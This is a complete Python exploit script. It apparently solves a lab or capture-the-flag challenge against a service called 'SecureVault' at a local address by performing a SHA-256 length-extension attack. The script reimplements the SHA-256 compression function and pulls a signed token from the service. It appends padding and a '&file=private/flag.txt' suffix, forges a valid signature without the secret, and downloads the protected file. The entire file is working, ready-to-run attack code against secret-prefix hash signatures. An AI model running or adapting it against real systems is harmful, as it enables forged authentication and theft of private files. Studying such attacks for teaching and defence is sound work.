#!/usr/bin/env python3
import argparse
import json
import ssl
import struct
import sys
from urllib.parse import quote
from urllib.request import urlopen


K = (
    0x428A2F98, 0x71374491, 0xB5C0FBCF, 0xE9B5DBA5,
    0x3956C25B, 0x59F111F1, 0x923F82A4, 0xAB1C5ED5,
    0xD807AA98, 0x12835B01, 0x243185BE, 0x550C7DC3,
    0x72BE5D74, 0x80DEB1FE, 0x9BDC06A7, 0xC19BF174,
    0xE49B69C1, 0xEFBE4786, 0x0FC19DC6, 0x240CA1CC,
    0x2DE92C6F, 0x4A7484AA, 0x5CB0A9DC, 0x76F988DA,
    0x983E5152, 0xA831C66D, 0xB00327C8, 0xBF597FC7,
    0xC6E00BF3, 0xD5A79147, 0x06CA6351, 0x14292967,
    0x27B70A85, 0x2E1B2138, 0x4D2C6DFC, 0x53380D13,
    0x650A7354, 0x766A0ABB, 0x81C2C92E, 0x92722C85,
    0xA2BFE8A1, 0xA81A664B, 0xC24B8B70, 0xC76C51A3,
    0xD192E819, 0xD6990624, 0xF40E3585, 0x106AA070,
    0x19A4C116, 0x1E376C08, 0x2748774C, 0x34B0BCB5,
    0x391C0CB3, 0x4ED8AA4A, 0x5B9CCA4F, 0x682E6FF3,
    0x748F82EE, 0x78A5636F, 0x84C87814, 0x8CC70208,
    0x90BEFFFA, 0xA4506CEB, 0xBEF9A3F7, 0xC67178F2,
)


def rotr(value, amount):
    return ((value >> amount) | (value << (32 - amount))) & 0xFFFFFFFF


def sha256_padding(message_len):
    padding = b"\x80"
    padding += b"\x00" * ((56 - (message_len + 1) % 64) % 64)
    padding += struct.pack(">Q", message_len * 8)
    return padding


def sha256_compress(chunk, state):
    words = list(struct.unpack(">16L", chunk))
    for i in range(16, 64):
        s0 = rotr(words[i - 15], 7) ^ rotr(words[i - 15], 18) ^ (words[i - 15] >> 3)
        s1 = rotr(words[i - 2], 17) ^ rotr(words[i - 2], 19) ^ (words[i - 2] >> 10)
        words.append((words[i - 16] + s0 + words[i - 7] + s1) & 0xFFFFFFFF)

    a, b, c, d, e, f, g, h = state
    for i in range(64):
        big_s1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
        ch = (e & f) ^ (~e & g)
        temp1 = (h + big_s1 + ch + K[i] + words[i]) & 0xFFFFFFFF
        big_s0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        temp2 = (big_s0 + maj) & 0xFFFFFFFF

        h = g
        g = f
        f = e
        e = (d + temp1) & 0xFFFFFFFF
        d = c
        c = b
        b = a
        a = (temp1 + temp2) & 0xFFFFFFFF

    return tuple((x + y) & 0xFFFFFFFF for x, y in zip(state, (a, b, c, d, e, f, g, h)))


def sha256_continue(data, state, processed_len):
    if processed_len % 64 != 0:
        raise ValueError("processed_len must be block-aligned")

    message = data + sha256_padding(processed_len + len(data))
    current = state
    for offset in range(0, len(message), 64):
        current = sha256_compress(message[offset:offset + 64], current)
    return "".join(f"{word:08x}" for word in current)


def parse_state(digest_hex):
    if len(digest_hex) != 64:
        raise ValueError("expected a SHA-256 hex digest")
    return tuple(int(digest_hex[i:i + 8], 16) for i in range(0, 64, 8))


def forge_token(token, signature, secret_len, suffix):
    original = token.encode("latin-1")
    suffix_bytes = suffix.encode("latin-1")
    glue = sha256_padding(secret_len + len(original))
    processed_len = secret_len + len(original) + len(glue)
    forged_sig = sha256_continue(suffix_bytes, parse_state(signature), processed_len)
    return original + glue + suffix_bytes, forged_sig


def token_query_value(token_bytes):
    # Flask decodes query strings as Unicode and the app re-encodes with latin-1.
    # Encoding the latin-1 string with quote() preserves arbitrary token bytes.
    return quote(token_bytes.decode("latin-1"), safe="")


def fetch_json(url, context=None):
    with urlopen(url, context=context) as response:
        return json.loads(response.read().decode())


def main():
    parser = argparse.ArgumentParser(description="Exploit SecureVault SHA-256 length extension")
    parser.add_argument("base_url", nargs="?", default="http://127.0.0.1:8080")
    parser.add_argument("--secret-len", type=int, default=16)
    parser.add_argument("--suffix", default="&file=private/flag.txt")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    context = ssl._create_unverified_context() if args.insecure else None
    files = fetch_json(f"{base_url}/files", context)["files"]
    if not files:
        print("No signed files returned by /files", file=sys.stderr)
        return 1

    signed_file = files[0]
    forged_token, forged_sig = forge_token(
        signed_file["token"],
        signed_file["sig"],
        args.secret_len,
        args.suffix,
    )
    forged_url = (
        f"{base_url}/download"
        f"?token={token_query_value(forged_token)}"
        f"&sig={forged_sig}"
    )

    print(f"[*] Original token: {signed_file['token']}")
    print(f"[*] Original sig:   {signed_file['sig']}")
    print(f"[*] Forged sig:     {forged_sig}")
    print(f"[*] Forged URL:     {forged_url}")
    print(json.dumps(fetch_json(forged_url, context), indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
